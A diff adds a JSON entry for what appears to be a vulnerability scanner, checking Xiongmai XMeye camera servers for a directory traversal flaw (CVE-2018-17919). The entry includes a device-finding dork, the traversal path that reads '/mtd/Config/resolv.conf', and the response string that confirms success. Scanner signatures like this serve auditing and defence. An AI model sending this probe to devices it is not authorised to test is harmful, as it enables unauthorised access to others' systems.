@@ -1,0 +1,17 @@
+{
+    "name": "Hangzhou Xiongmai Technology Co., Ltd XMeye P2P Cloud Server Directory Traversal",
+    "method": "GET",
+    "port": [
+        80
+    ],
+    "dork": "title=NETSurveillance WEB",
+    "suffix": [
+        "/../mtd/Config/resolv.conf"
+    ],
+    "hits": [
+        "nameserver"
+    ],
+    "references": [
+        "https://ti.360.net/advisory/articles/advisory-of-cve-2018-17919/"
+    ]
+}
